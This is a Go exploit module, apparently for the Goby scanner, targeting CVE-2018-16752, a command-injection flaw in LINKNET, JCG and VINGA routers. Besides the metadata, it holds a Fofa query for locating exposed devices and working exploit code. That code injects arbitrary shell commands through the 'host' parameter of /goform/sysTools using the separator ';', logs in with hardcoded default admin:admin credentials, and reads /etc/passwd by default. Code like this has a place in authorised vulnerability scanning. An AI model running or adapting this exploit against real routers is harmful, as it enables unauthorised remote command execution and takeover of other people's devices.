package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Multiple models routers Background RCE (CVE-2018-16752)",
    "Description": "Many routers such as JCG, LINKNET and VINGA execute commands in the background. Hackers can execute arbitrary commands on the server and write into the backdoor, thus invading the server and gaining the administrator's authority of the server, which is very harmful.",
    "Impact": "Multiple models routers Background RCE (CVE-2018-16752)",
    "Recommendation": "<p>1. Strictly filter the data entered by the user, filter sensitive characters, and prohibit the execution of system commands.</p><p>2. Update to the latest version. Website: <a href=\"http://linknet-usa.com/main/product_info.php?products_id=35&amp;language=es\">http://linknet-usa.com/main/product_info.php?products_id=35&amp;language=es</a></p>",
    "Product": "LINK-NET-LW-N605R",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "多款路由器后台命令执行（CVE-2018-16752）",
            "Description": "捷稀（JCG）、LINKNET、VINGA等多款路由器后台命令执行，黑客可在服务器上执行任意命令，写入后门，从而入侵服务器，获取服务器的管理员权限，危害巨大。",
            "Impact": "<p>攻击者在一定的情况下（拥有登入授权），可在服务器上执行某些命令（有些命令不存在），写入后门，从而入侵服务器，获取服务器的管理员权限，危害巨大。</p>",
            "Recommendation": "<p>1.严格过滤用户输入的数据，对敏感字符进行过滤，禁止执行系统命令。</p><p>2.更新到最新的版本。网址：<a href=\"http://linknet-usa.com/main/product_info.php?products_id=35&amp;language=es\" rel=\"nofollow\">http://linknet-usa.com/main/product_info.php?products_id=35&amp;language=es</a></p>",
            "Product": "LINK-NET-LW-N605R",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Multiple models routers Background RCE (CVE-2018-16752)",
            "Description": "Many routers such as JCG, LINKNET and VINGA execute commands in the background. Hackers can execute arbitrary commands on the server and write into the backdoor, thus invading the server and gaining the administrator's authority of the server, which is very harmful.",
            "Impact": "Multiple models routers Background RCE (CVE-2018-16752)",
            "Recommendation": "<p>1. Strictly filter the data entered by the user, filter sensitive characters, and prohibit the execution of system commands.</p><p>2. Update to the latest version. Website: <a href=\"http://linknet-usa.com/main/product_info.php?products_id=35&amp;language=es\">http://linknet-usa.com/main/product_info.php?products_id=35&amp;language=es</a></p>",
            "Product": "LINK-NET-LW-N605R",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"MouseOverOut('wizardOn','wizardOff');\"",
    "GobyQuery": "body=\"MouseOverOut('wizardOn','wizardOff');\"",
    "Author": "atdpa4sw0rd@gmail.com",
    "Homepage": "https://www.linkedin.com/in/nassim-asrir-b73a57122",
    "DisclosureDate": "2021-06-02",
    "References": [
        "http://www.cnvd.org.cn/flaw/show/CNVD-2018-18480"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2018-16752"
    ],
    "CNVD": [
        "CNVD-2018-18480"
    ],
    "CNNVD": [
        "CNNVD-201809-940"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "cat /etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10199"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(8)
			cfgGet := httpclient.NewGetRequestConfig("/goform/sysTools?tool=0&pingCount=4&host=127.0.0.1;echo" + "%20" + randStr + "\"\"''" + randStr)
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.Header.Store("Authorization", "Basic YWRtaW46YWRtaW4=")
			cfgGet.FollowRedirect = true
			cfgGet.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfgGet); err == nil {
				return resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, randStr+randStr))
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			cmdEn := url.QueryEscape(fmt.Sprintf("%s", cmd))
			uri := "/goform/sysTools?tool=0&pingCount=4&host=127.0.0.1;" + cmdEn + "&sumbit=OK"
			cfgGet := httpclient.NewGetRequestConfig(uri)
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.Header.Store("Authorization", "Basic YWRtaW46YWRtaW4=")
			cfgGet.FollowRedirect = true
			cfgGet.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgGet); err == nil {
				expResult.Success = true
				resinfo := regexp.MustCompile(`(?s)readonly="1">(.*?)</textarea>`).FindStringSubmatch(resp.RawBody)[1]
				expResult.Output = resinfo
			}
			return expResult
		},
	))
}
